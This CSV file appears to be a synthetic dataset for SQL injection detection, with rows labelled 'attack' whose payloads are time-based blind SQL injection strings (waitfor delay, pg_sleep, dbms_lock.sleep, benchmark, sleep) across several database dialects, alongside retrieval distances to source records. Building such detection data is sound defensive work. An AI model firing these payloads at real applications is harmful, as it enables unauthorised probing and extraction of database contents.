id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,6.0083833633765265
CTGAN_000002,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000128,7.447872767608805
CTGAN_000003,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.179764440663453
CTGAN_000004,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000066,5.272033743985492
CTGAN_000005,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000212,7.244287398778237
CTGAN_000006,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000207,5.801929959752421
CTGAN_000007,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,5.469640039389331
CTGAN_000008,attack,time,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',nearest_attack_euclidean,R000203,8.219527094312056
CTGAN_000009,attack,time,"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000116,7.238520853102032
CTGAN_000010,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000157,5.882524820110053
CTGAN_000011,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,7.3469104954625095
CTGAN_000012,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,5.023055430702927
CTGAN_000013,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,5.418766151239851
CTGAN_000014,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R000074,6.641628173190497
CTGAN_000015,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.941197762800264
CTGAN_000016,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.149976513980294
CTGAN_000017,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,6.744005488674225
CTGAN_000018,attack,time,1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',nearest_attack_euclidean,R000203,7.623401893773691
CTGAN_000019,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,7.729279055689099
CTGAN_000020,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,9.600916121864572
CTGAN_000021,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.0480197850157245
